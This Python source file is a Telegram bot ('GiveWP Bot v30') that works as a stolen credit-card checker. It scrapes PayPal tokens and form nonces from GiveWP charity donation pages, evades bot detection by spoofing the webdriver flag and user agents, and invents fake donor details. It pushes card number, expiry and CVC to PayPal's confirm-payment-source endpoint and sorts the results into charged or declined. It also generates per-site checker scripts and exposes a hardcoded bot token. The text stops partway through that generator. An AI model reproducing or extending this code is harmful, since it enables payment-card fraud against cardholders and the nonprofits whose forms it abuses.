#!/usr/bin/env python3
"""GiveWP Bot v30 — Playwright Extract + Requests Charge"""
import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
import gc
import sys
import asyncio
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from playwright.async_api import async_playwright
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("⚠️ Playwright not installed")

try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]
        def random(self):
            return random.choice(self.agents)

token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

PAYPAL_METADATA_ID = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"

PAYPAL_RESPONSES = [
    'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
    'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
    'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD',
    'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED',
    'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD',
    'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE',
    'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD',
    'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED',
    'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'DECLINED', 'CHARGE',
    'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR', 'AUTHENTICATION_FAILURE',
    'NOT_AUTHORIZED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
]


# ═══════════════════════════════════════════════════════════════
# PLAYWRIGHT EXTRACTOR — استخراج فقط
# ═══════════════════════════════════════════════════════════════
class PWExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.result = {
            'client_id': None,
            'access_token': None,
            'client_token': None,
            'form_data': {},
            'ajax_url': None,
            'cookies': {},
            'minimum_amount': '1.00',
            'price_ids': [],
            'price_id': '3',
            'nonce': None,
            'form_id_prefix': None,
            'form_id': None,
            'html_snippet': '',
            'is_valid': False,
        }

    def _extract_from_html(self, html):
        # client_id
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
            r'data-client-id=["\']([^"\']+)["\']',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-paypal-client-id=["\']([^"\']+)',
        ]
        for p in patterns:
            m = re.search(p, html, re.IGNORECASE)
            if m:
                self.result['client_id'] = m.group(1)
                break

        # data-client-token (base64 → accessToken)
        m = re.search(r'"data-client-token"\s*:\s*"([^"]+)"', html)
        if m:
            enc = m.group(1)
            self.result['client_token'] = enc
            try:
                padded = enc + '=' * (-len(enc) % 4)
                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                tm = re.search(r'"accessToken":"([^"]+)"', dec)
                if tm:
                    self.result['access_token'] = tm.group(1)
            except:
                pass

        # accessToken مباشرة
        if not self.result['access_token']:
            m = re.search(r'"accessToken"\s*:\s*"([^"]+)"', html)
            if m:
                self.result['access_token'] = m.group(1)

        # form fields
        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
        if m: self.result['form_id_prefix'] = m.group(1)
        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
        if m: self.result['form_id'] = m.group(1)
        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
        if m: self.result['nonce'] = m.group(1)
        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
        if m and m.group(1).strip():
            try:
                float(m.group(1))
                self.result['minimum_amount'] = m.group(1)
            except:
                pass
        m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
        if m: self.result['price_id'] = m.group(1)

        # hidden form data
        for m in re.finditer(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
            self.result['form_data'][m.group(1)] = m.group(2)

        # price_ids
        seen = set()
        for m in re.finditer(r'data-price-id=["\']([^"\']+)["\']', html):
            pid = m.group(1)
            if pid not in seen:
                seen.add(pid)
                self.result['price_ids'].append(pid)

        # ajax
        if 'admin-ajax.php' in html:
            self.result['ajax_url'] = 'admin-ajax.php'
        elif 'wc-ajax' in html:
            self.result['ajax_url'] = 'wc-ajax'

    async def extract(self):
        if not HAS_PW:
            return self._fallback_requests()

        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        "--no-sandbox", "--disable-setuid-sandbox",
                        "--disable-dev-shm-usage", "--disable-gpu",
                        "--single-process", "--no-zygote",
                        "--disable-blink-features=AutomationControlled",
                        "--ignore-certificate-errors",
                    ]
                )
                try:
                    ctx = await browser.new_context(
                        user_agent=uu.random if HAS_FAKE_UA else SimpleUA().random,
                        viewport={"width": 1366, "height": 900},
                        locale="en-US",
                        ignore_https_errors=True,
                    )
                    await ctx.add_init_script("""
                        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                        window.chrome={runtime:{}};
                    """)
                    page = await ctx.new_page()
                    try:
                        await page.goto(self.target_url, wait_until="domcontentloaded", timeout=30000)
                    except:
                        pass
                    await asyncio.sleep(3)

                    # استنى تحميل JS
                    for _ in range(5):
                        html = await page.content()
                        if 'give-form-hash' in html and 'data-client-token' in html:
                            break
                        await asyncio.sleep(2)

                    # جرب iframe
                    if 'give-form-id-prefix' not in html or 'give-form-hash' not in html:
                        for frame in page.frames:
                            if frame == page.main_frame:
                                continue
                            try:
                                fhtml = await frame.content()
                                if 'give-form-id-prefix' in fhtml:
                                    html = fhtml
                                    break
                            except:
                                continue

                    self._extract_from_html(html)

                    # cookies
                    cookies = await ctx.cookies()
                    self.result['cookies'] = {c['name']: c['value'] for c in cookies}

                    self.result['is_valid'] = bool(
                        self.result['form_id'] and self.result['nonce']
                    )
                    return self.result
                finally:
                    try:
                        await browser.close()
                    except:
                        pass
        except Exception as e:
            print(f"⚠️ Playwright error: {e}")
            return self._fallback_requests()

    def _fallback_requests(self):
        try:
            r = requests.get(
                self.target_url,
                headers={'user-agent': SimpleUA().random if not HAS_FAKE_UA else uu.random},
                timeout=20,
                verify=False,
            )
            self.result['cookies'] = dict(r.cookies)
            html = r.text

            if 'give-form-id-prefix' not in html or 'give-form-hash' not in html:
                for pat in [
                    r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
                    r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
                    r'<iframe[^>]*src="([^"]*donation[^"]*)"',
                ]:
                    m = re.search(pat, html, re.IGNORECASE)
                    if m:
                        iurl = m.group(1)
                        if iurl.startswith('//'): iurl = 'https:' + iurl
                        elif iurl.startswith('/'): iurl = f'https://{urlparse(self.target_url).netloc}{iurl}'
                        try:
                            r2 = requests.get(iurl, headers={'user-agent': 'Mozilla/5.0'}, timeout=20, verify=False)
                            html = r2.text
                            self.result['cookies'].update(dict(r2.cookies))
                        except:
                            pass
                        break

            self._extract_from_html(html)
            self.result['is_valid'] = bool(
                self.result['form_id'] and self.result['nonce']
            )
            return self.result
        except Exception as e:
            print(f"⚠️ Fallback error: {e}")
            return self.result


def extract_gateway(target_url):
    """دالة متزامنة للاستخراج"""
    extractor = PWExtractor(target_url)
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(extractor.extract())
        finally:
            loop.close()
    except Exception as e:
        print(f"⚠️ extract_gateway error: {e}")
        return extractor.result


# ═══════════════════════════════════════════════════════════════
# PayPalCommerce — الدفع بـ requests
# ═══════════════════════════════════════════════════════════════
class PayPalCommerce:
    def __init__(self, target_url=None, extracted=None):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]
        self.currency = "USD"
        self.r = requests.Session()
        self.r.verify = False
        self.r.headers.update({'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9'})
        self.uu = UserAgent() if HAS_FAKE_UA else SimpleUA()

        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.minimum_amount = "1.00"
        self.price_id = "3"
        self.form_id_prefix = None
        self.form_id = None
        self.nonce = None

        self.target_url = target_url
        parsed = urlparse(target_url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        if parsed.query:
            self.inurl += f"?{parsed.query}"

        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.is_valid_gateway = True
        self.gateway_type = 'paypal-commerce'
        self.paypal_responses = PAYPAL_RESPONSES.copy()

        self.working_amount = None
        self.working_price_id = None

        # استخدم البيانات اللي Playwright استخرجتها
        if extracted and extracted.get('is_valid'):
            self.client_id = extracted.get('client_id')
            self.access_token = extracted.get('access_token')
            self.client_token = extracted.get('client_token')
            self.form_data = extracted.get('form_data', {})
            self.cookies = extracted.get('cookies', {})
            self.minimum_amount = extracted.get('minimum_amount', '1.00')
            self.price_id = extracted.get('price_id', '3')
            self.form_id_prefix = extracted.get('form_id_prefix')
            self.form_id = extracted.get('form_id')
            self.nonce = extracted.get('nonce')
            self.r.cookies.update(self.cookies)

            ajax_url_type = extracted.get('ajax_url')
            if ajax_url_type == 'admin-ajax.php':
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            elif ajax_url_type == 'wc-ajax':
                self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
        else:
            self._init_and_extract()
            self._get_access_token()
            self._get_client_token()

    def get_next_ua(self):
        try:
            return self.uu.random
        except:
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'

    def get_address_data(self):
        return {
            'give-address1': '123 Main Street',
            'give-city': 'New York City', 'give-state': 'NY',
            'give-zip': '10001', 'give-country': 'US',
            'give-phone': '2125551234',
        }

    def get_terms_data(self):
        return {
            'give_agree_to_terms': '1',
            'give_tos_agree': '1',
        }

    def get_base_form_data(self):
        form_data = self.form_data.copy()
        first_name = random.choice(self.first_name)
        last_name = random.choice(self.last_name)
        form_data.update({
            'give-currency': self.currency,
            'currency': self.currency,
            'payment-mode': self.gateway_type,
            'give_first': first_name,
            'give_last': last_name,
            'give_email': self.email,
            'give-gateway': self.gateway_type,
            'give_company': '',
            'give_comment': '',
            'give_anonymous': '0',
        })
        form_data.update(self.get_address_data())
        form_data.update(self.get_terms_data())
        return form_data

    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': self.get_next_ua(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            self.r.cookies.update(self.cookies)
            html = response.text

            # form fields
            m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
            if m: self.form_id_prefix = m.group(1)
            m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
            if m: self.form_id = m.group(1)
            m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
            if m: self.nonce = m.group(1)
            m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
            if m and m.group(1).strip():
                try:
                    float(m.group(1))
                    self.minimum_amount = m.group(1)
                except:
                    pass
            m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
            if m: self.price_id = m.group(1)

            for m in re.finditer(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html):
                self.form_data[m.group(1)] = m.group(2)

            if 'admin-ajax.php' in html:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

            # tokens
            m = re.search(r'"data-client-token"\s*:\s*"([^"]+)"', html)
            if m:
                enc = m.group(1)
                self.client_token = enc
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    tm = re.search(r'"accessToken":"([^"]+)"', dec)
                    if tm:
                        self.access_token = tm.group(1)
                except:
                    pass

            if not self.access_token:
                m = re.search(r'"accessToken"\s*:\s*"([^"]+)"', html)
                if m:
                    self.access_token = m.group(1)
        except:
            self.is_valid_gateway = False

    def _get_access_token(self):
        if not self.client_id or self.access_token:
            return
        try:
            headers = {'user-agent': self.get_next_ua(), 'content-type': 'application/x-www-form-urlencoded'}
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token',
                headers=headers,
                data={'grant_type': 'client_credentials'},
                auth=(self.client_id, ''),
                timeout=15
            )
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
        except:
            pass

    def _get_client_token(self):
        if not self.ajax_url or self.client_token:
            return
        try:
            actions = [
                'give_paypal_commerce_get_client_token',
                'get_client_token',
                'paypal_get_client_token',
            ]
            for action in actions:
                data = {'action': action, 'form-id': self.form_id or ''}
                headers = {
                    'user-agent': self.get_next_ua(),
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': f'https://{self.url}',
                    'referer': f'https://{self.url}{self.inurl}',
                }
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict):
                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                            elif isinstance(json_data['data'], str):
                                self.client_token = json_data['data']
                            if self.client_token:
                                return
                    except:
                        pass
        except:
            pass
            # ═══════════════════════════════════════════════════════════════
# give_process_donation — قبل create_order (زي Aizen)
# ═══════════════════════════════════════════════════════════════
def _give_process_donation(self):
    if not self.ajax_url:
        return None
    try:
        headers = {
            'user-agent': self.get_next_ua(),
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        form_data = self.get_base_form_data()
        form_data.update({
            'give-form-id-prefix': self.form_id_prefix or '',
            'give-form-id': self.form_id or '',
            'give-form-title': '',
            'give-current-url': self.target_url,
            'give-form-url': self.target_url,
            'give-form-minimum': '',
            'give-form-maximum': '999999.99',
            'give-form-hash': self.nonce or '',
            'give-price-id': self.price_id,
            'give-amount': '',
            'give-honeypot': '',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give_stripe_payment_method': '',
            'card_name': 'Aizen ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        })
        r = self.r.post(self.ajax_url, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
        return r
    except:
        return None

# ═══════════════════════════════════════════════════════════════
# create_order_smart — الترتيب الجديد
# ═══════════════════════════════════════════════════════════════
def _create_order_smart(self):
    if not self.ajax_url:
        return None

    # ترتيب المحاولات
    attempts = []

    # 1. minimum_amount + custom
    attempts.append((self.minimum_amount, 'custom'))
    # 2. minimum_amount + price_id من الفورم
    attempts.append((self.minimum_amount, self.price_id))
    # 3. '' + '3' (زي Aizen)
    attempts.append(('', '3'))
    # 4. '' + price_id من الفورم
    attempts.append(('', self.price_id))
    # 5. 5.00 + custom
    attempts.append(('5.00', 'custom'))
    # 6. '' + 'custom'
    attempts.append(('', 'custom'))

    # شيل المكرر
    seen = set()
    unique = []
    for a in attempts:
        if a not in seen:
            seen.add(a)
            unique.append(a)

    headers = {
        'user-agent': self.get_next_ua(),
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with': 'XMLHttpRequest',
        'origin': f'https://{self.url}',
        'referer': f'https://{self.url}{self.inurl}',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }

    actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']

    for amount, price_id in unique:
        form_data = self.get_base_form_data()
        form_data.update({
            'give-form-id-prefix': self.form_id_prefix or '',
            'give-form-id': self.form_id or '',
            'give-form-title': '',
            'give-current-url': self.target_url,
            'give-form-url': self.target_url,
            'give-form-minimum': '',
            'give-form-maximum': '999999.99',
            'give-form-hash': self.nonce or '',
            'give-price-id': price_id,
            'give-amount': amount,
            'amount': amount,
            'give-honeypot': '',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give_stripe_payment_method': '',
            'card_name': 'Test Bot',
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': self.gateway_type,
        })
        for action in actions:
            params = {'action': action}
            try:
                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                self.working_amount = amount
                                self.working_price_id = price_id
                                return json_data['data']['id']
                            elif isinstance(json_data['data'], str):
                                self.working_amount = amount
                                self.working_price_id = price_id
                                return json_data['data']
                        if 'id' in json_data:
                            self.working_amount = amount
                            self.working_price_id = price_id
                            return json_data['id']
                    except:
                        pass
            except:
                continue
        time.sleep(1.5)

    return None

# ═══════════════════════════════════════════════════════════════
# confirm — metadata ثابت + headers كاملة
# ═══════════════════════════════════════════════════════════════
def _confirm_card(self, order_id, n, mm, yy, cvc):
    expiry = f"20{yy}-{mm}"

    auth_tokens = []
    if self.client_token:
        auth_tokens.append(self.client_token)
    if self.access_token:
        auth_tokens.append(self.access_token)
    if self.client_id:
        auth_tokens.append(self.client_id)

    last_text = ""
    for auth_token in auth_tokens:
        he4 = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {auth_token}',
            'braintree-sdk-version': BRAINTREE_SDK,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': PAYPAL_METADATA_ID,
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': self.get_next_ua(),
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': expiry,
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                }
            },
            'application_context': {'vault': False},
        }
        try:
            confirm_res = self.r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=he4, json=da3, timeout=15
            )
            last_text = confirm_res.text

            # فحص الرد
            if confirm_res.status_code == 200:
                try:
                    confirm_json = confirm_res.json()
                    if isinstance(confirm_json, dict):
                        if 'details' in confirm_json and len(confirm_json['details']) > 0:
                            detail = confirm_json['details'][0]
                            issue = detail.get('issue', '')
                            desc = detail.get('description', '')
                            if issue:
                                if issue == 'ORDER_NOT_APPROVED':
                                    return "Payer cannot pay for this transaction."
                                if desc:
                                    return f"{issue}: {desc}"
                                return issue
                except:
                    pass
                # لو 200 من غير error → نرجع None عشان نكمل approve
                return None

            # 400/422 → نحلل الرد
            if confirm_res.status_code in (400, 422):
                try:
                    confirm_json = confirm_res.json()
                    if isinstance(confirm_json, dict):
                        if 'details' in confirm_json and len(confirm_json['details']) > 0:
                            detail = confirm_json['details'][0]
                            issue = detail.get('issue', '')
                            desc = detail.get('description', '')
                            if issue:
                                if issue == 'ORDER_NOT_APPROVED':
                                    return "Payer cannot pay for this transaction."
                                if desc:
                                    return f"{issue}: {desc}"
                                return issue
                        if 'name' in confirm_json:
                            name = confirm_json.get('name', '')
                            if name:
                                return name
                except:
                    pass

                # regex fallback
                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', last_text)
                if issue_matches:
                    issue = issue_matches[0]
                    if issue == 'ORDER_NOT_APPROVED':
                        return "Payer cannot pay for this transaction."
                    return issue
        except:
            continue

    return None

# ═══════════════════════════════════════════════════════════════
# approve_order
# ═══════════════════════════════════════════════════════════════
def _approve_order(self, order_id):
    if not self.ajax_url:
        return None

    headers = {
        'user-agent': self.get_next_ua(),
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with': 'XMLHttpRequest',
        'origin': f'https://{self.url}',
        'referer': f'https://{self.url}{self.inurl}',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }

    actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']

    form_data = self.get_base_form_data()
    form_data.update({
        'give-form-id-prefix': self.form_id_prefix or '',
        'give-form-id': self.form_id or '',
        'give-form-title': '',
        'give-current-url': self.target_url,
        'give-form-url': self.target_url,
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': self.nonce or '',
        'give-price-id': self.working_price_id or self.price_id,
        'give-amount': self.working_amount or self.minimum_amount,
        'amount': self.working_amount or self.minimum_amount,
        'give-honeypot': '',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give_stripe_payment_method': '',
        'card_name': 'Test Bot',
        'card_exp_month': '',
        'card_exp_year': '',
        'give-gateway': self.gateway_type,
    })

    for action in actions:
        params = {'action': action, 'order': order_id}
        try:
            response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
            if response.status_code == 200:
                return response
        except:
            continue
    return None

# ═══════════════════════════════════════════════════════════════
# _clean_response — صارم
# ═══════════════════════════════════════════════════════════════
def _clean_response(self, text):
    if not text:
        return "DECLINED"

    text_strip = text.strip()
    text_lower = text_strip.lower()

    # HTML → DEAD
    if '<!DOCTYPE' in text_strip.upper() or '<html' in text_strip.upper():
        return "DECLINED"

    # JSON parse
    try:
        js = json.loads(text_strip)
        if isinstance(js, dict):
            success = js.get('success')

            # success:true → CHARGE (لو COMPLETED أو APPROVED)
            if success is True:
                data = js.get('data', {})
                if isinstance(data, dict):
                    order = data.get('order', {})
                    if isinstance(order, dict):
                        status = str(order.get('status', '')).upper()
                        if status in ('COMPLETED', 'APPROVED'):
                            return 'CHARGE 1.0'
                return 'CHARGE 1.0'

            # success:false → نفحص PayPal codes
            if success is False:
                err = json.dumps(js.get('data', {}), ensure_ascii=False).upper()
                for pr in self.paypal_responses:
                    if pr.upper() in err:
                        if pr == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        return pr
                return "DECLINED"
    except:
        pass

    # PayPal codes مباشرة
    for pr in self.paypal_responses:
        if pr in text_strip.upper():
            if pr == 'ORDER_NOT_APPROVED':
                return "Payer cannot pay for this transaction."
            return pr

    # insufficient
    if 'insufficient' in text_lower:
        return 'INSUFFICIENT_FUNDS'

    return text_strip[:200]

# ═══════════════════════════════════════════════════════════════
# Charge — الرئيسية
# ═══════════════════════════════════════════════════════════════
def Charge(self, ccx):
    try:
        if not self.is_valid_gateway:
            return "INVALID_GATEWAY"

        parts = ccx.strip().split("|")
        if len(parts) < 4:
            return "Invalid card format"

        n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        # 1. give_process_donation الأول (زي Aizen)
        self._give_process_donation()
        time.sleep(0.5)

        # 2. create_order_smart
        order_id = self._create_order_smart()
        if not order_id:
            return "Create Order Failed"

        # 3. confirm
        confirm_result = self._confirm_card(order_id, n, mm, yy, cvc)
        if confirm_result:
            return confirm_result

        # 4. approve
        approve_res = self._approve_order(order_id)
        if approve_res:
            return self._clean_response(approve_res.text)

        return "DECLINED"
    except Exception as e:
        return f"Error: {e}"
        
# ═══════════════════════════════════════════════════════════════
# generate_gateway_code — مع working_amount + working_price_id
# ═══════════════════════════════════════════════════════════════
def generate_gateway_code(result, link, paypal_obj=None):
    id_form1 = ''
    id_form2 = ''
    nonec = ''
    au = ''
    minimum_amount = '1.00'
    working_amount = ''
    working_price_id = '3'
    client_id = ''

    if paypal_obj:
        id_form1 = paypal_obj.form_id_prefix or paypal_obj.form_data.get('give-form-id-prefix', '')
        id_form2 = paypal_obj.form_id or paypal_obj.form_data.get('give-form-id', '')
        nonec = paypal_obj.nonce or paypal_obj.form_data.get('give-form-hash', '')
        au = paypal_obj.client_token or paypal_obj.access_token or ''
        client_id = paypal_obj.client_id or ''
        minimum_amount = paypal_obj.minimum_amount or '1.00'
        working_amount = paypal_obj.working_amount or ''
        working_price_id = paypal_obj.working_price_id or paypal_obj.price_id or '3'

    return f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

PAYPAL_METADATA_ID = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "{working_amount or minimum_amount}"
        self.minimum_amount = "{minimum_amount}"
        self.working_amount = "{working_amount}"
        self.working_price_id = "{working_price_id}"
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.nonec = "{nonec}"
        self.au = "{au}"
        self.client_id = "{client_id}"
        self.url = "{urlparse(link).netloc}"
        self.inurl = "{urlparse(link).path}"
        if urlparse(link).query:
            self.inurl += "?{urlparse(link).query}"
        self.target_url = "{link}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def _get_base_form(self, amount, price_id):
        return {{
            'give-honeypot': '',
            'give-form-id-prefix': self.id_form1,
            'give-form-id': self.id_form2,
            'give-form-title': '',
            'give-current-url': self.target_url,
            'give-form-url': self.target_url,
            'give-form-minimum': '',
            'give-form-maximum': '999999.99',
